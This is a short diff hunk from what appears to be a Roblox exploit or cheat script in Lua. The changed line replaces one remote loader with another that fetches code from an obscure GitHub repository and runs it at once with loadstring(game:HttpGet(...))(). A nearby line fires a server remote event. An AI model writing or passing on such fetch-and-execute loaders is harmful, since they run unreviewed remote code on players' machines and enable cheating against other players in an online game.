@@ -25,7 +25,7 @@ game.StarterGui:SetCore("SendNotification", {
   Duration = 5,
 })
 game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(r0_0))
-loadstring(game:HttpGet("https://raw.githubusercontent.com/joygril/JG-Script/refs/heads/main/Jeon-Hub.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ggraef262-max/Ftuuggn/refs/heads/main/Waghashab"))()
 local r1_0 = MakeWindow
 local r2_0 = {
   Hub = {
